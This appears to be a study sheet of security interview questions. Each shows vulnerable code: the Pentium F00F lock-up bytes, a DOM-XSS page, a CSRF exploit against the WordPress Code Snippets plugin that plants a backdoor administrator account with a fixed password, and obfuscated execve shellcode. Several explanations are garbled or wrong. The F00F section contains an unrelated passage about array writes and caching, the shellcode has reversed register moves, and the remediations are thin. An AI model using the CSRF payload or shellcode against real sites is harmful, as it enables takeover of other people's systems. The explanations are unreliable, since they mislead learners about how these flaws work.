# Static Code assessment round interview questions

## Idenfity and explain the Vulnerability 1 : Linux command/ Buffer Overflow/ Malware 
### (10 points)

### Vulnerable Code :
```
char x [5] = { 0xf0, 0x0f, 0xc7, 0xc8 };

main ()
{
       void (*f)() = x;
       f();
}
```

### Explanation :
Intel "f00f" Pentium bug : 

If you execute F0 0F C7 C8 on a P5 it will lock the machine up. This is true for any operating system including usermode Linux.
When run in *user* mode locks up pentium processors solid. 

99% of these writes were marking a space that was already marked. When you get up to walking by large strides most of those were already covered by one of the smaller factors.

So if you changed the code from:

     array[N] = 1
to:
     if (!array[N]) array[N] = 1

Now suddenly we are doing a read first, and after that read we skip the write so the data in the cache doesn't become modified and can be discarded in the future.

The byte sequence F0 0F C7 C8 represents the instruction lock cmpxchg8b eax
 
 Detailed review : https://en.wikipedia.org/wiki/Pentium_F00F_bug
 
 ### Remediation :
 None. Users have already upgraded to latest Intel chips. 
 
--------------------------------------------------
## Idenfity and explain the Vulnerability 2 : DOM-XSS ( HTML ) 
### (15 points)

### Vulnerable Code :
```
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>location.search</title>
</head>

<body>
<script>

var a = location.search;
if(a.indexOf("email") > -1) 
{
	document.write("Your email address is " +decodeURI(a.slice(a.indexOf("=")+1)));
	
}
else
{
	alert("Invalid Parameter");
}

</script>
</body>
</html>
```

### Explanation: 
To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.

Modern browser encodes output of location.search so it would only be vulnerable if JS sink is decoding input. 
Example sink : eval 

### Remediation: 
There is no single Remedy. However,the most effective way to avoid DOM-based vulnerabilities is to avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink.

--------------------------------------------------
## Idenfity and explain the Vulnerability 3 : CSRF ( Wordpress ) 
### (25 points)

### Vulnerable Code :
```
<!DOCTYPE html>
<html>
    <body>
        <h1>Identify the vulnerability</h1>

        <form>
            <input type="button" value="Submit request" onclick="submitRequest()" />
        </form>

        <script>
            function submitRequest()
            {
                // change this if you use tihs any where else other than localhost.
                var ip = ""; //link

                var maliciousCode = "add_action( 'init', function () {" +
	            "$username = 'victimuser';" +
                "$password = 'Password@1234';" +
                    "$email_address = '';" + //email
                    "if ( ! username_exists( $username ) ) {" +
                    "$user_id = wp_create_user( $username, $password, $email_address );" +
                        "$user = new WP_User( $user_id );" +
                        "$user->set_role( 'administrator' );" +
                        "};" +
                "} ); ?>";

                var xhr = new XMLHttpRequest();  

                xhr.open("POST", "http:\/\/" + ip + "\/wordpress\/wp-admin\/admin.php?page=import-snippets", true);
                xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryIpMt0484nyfHOSdA");
                xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9");
                xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
                xhr.withCredentials = true;

                var body = "------WebKitFormBoundaryIpMt0484nyfHOSdA\r\n" + 
                "Content-Disposition: form-data; name=\"duplicate_action\"\r\n" + 
                "\r\n" + 
                "ignore\r\n" + 
                "------WebKitFormBoundaryIpMt0484nyfHOSdA\r\n" + 
                "Content-Disposition: form-data; name=\"code_snippets_import_files[]\"; filename=\"code-snippets (2).json\"\r\n" + 
                "Content-Type: application/json\r\n" + 
                "\r\n" + 
                "{\"generator\":\"Code Snippets v2.13.3\",\"date_created\":\"2020-04-18 12:35\",\"snippets\":[{\"name\":\"PoC_Attack\",\"scope\":\"global\",\"code\":\"" + maliciousCode + "\",\"priority\":\"1\",\"active\":\"1\"}]}\r\n" + 
                "------WebKitFormBoundaryIpMt0484nyfHOSdA\r\n" + 
                "Content-Disposition: form-data; name=\"action\"\r\n" + 
                "\r\n" + 
                "save\r\n" + 
                "------WebKitFormBoundaryIpMt0484nyfHOSdA\r\n" + 
                "Content-Disposition: form-data; name=\"max_file_size\"\r\n" + 
                "\r\n" + 
                "2097152\r\n" + 
                "------WebKitFormBoundaryIpMt0484nyfHOSdA\r\n" + 
                "Content-Disposition: form-data; name=\"submit\"\r\n" + 
                "\r\n" + 
                "Upload files and import\r\n" + 
                "------WebKitFormBoundaryIpMt0484nyfHOSdA--\r\n";
                
                var aBody = new Uint8Array(body.length);
                for (var i = 0; i < aBody.length; i++)
                aBody[i] = body.charCodeAt(i); 
                xhr.send(new Blob([aBody]));
            }
        </script>        
    </body>
</html>
```

### Explanation : 
- The plugin allowed users to add snippets of PHP code to extend the functionality of a WordPress-powered website, without adding custom snippets to their theme’s functions.php file.
- Code Snippets offers an import menu for importing code onto the website. However, due to insufficient validation of the HTTP Referer header on the import menu, the plugin’s import function lacked CSRF protection.
- Without this protection, an attacker could craft a malicious request to trick an administrator into infecting their own site.
- Therefore, this vulnerability allows anybody to forge a request on behalf of an administrator and inject executable code on a vulnerable site. 

Detailed explanation : https://blog.wpsec.com/csrf-to-rce-wordpress/

### Remediation: 
Upgrade to the latest version of wordpress version.

--------------------------------------------------
## Idenfity and explain the Vulnerability 4 : Polymorphic Shellcode/ Buffer Overflow(Assembly) 
### (50 points)

### Vulnerable Code :
```
global _start

section .text

_start:

xor    eax, eax      ; zero our eax
push   eax

; push   0x68732f2f

mov eax, 0xd0e65e5e
ror eax, 1                       ; shift the register by 1 to right
push eax

; push   0x6e69622f
add eax, 0x5f63300               ; add 5f63300 to eax register to push 6e69622f                                       
push eax

mov    esp,ebx
mov    eax,ecx
mov    eax,edx
mov    al,0xb
int    0x80

; End section for exit call
xor    eax,eax
inc    eax
int    0x80
```

### Explanation : 
Here I have done two few changes to the code :

- The eax register for both 0x68732f2f is first brought to it's original form by first ROR the register by left.
- For this research, I have used bit shift calculator and shifted the accumulator by 1.
- Use the same method, I have added ror by 1 to shift the register back to it's original form to perform execve.
- Next, I have added 5f63300 to the accumulated eax to achieve 6e69622f instead of directly pushing it to the register.

Detailed explanation : https://github.com/cyb3rs4k1/SLAE32/tree/master/Assignment-VI/01_execve

### Remediation :
Advanced malware scanners with ML concepts implemented for malwares which act through bitwise shift rotations can detect the execution of this kind of shellcodes.

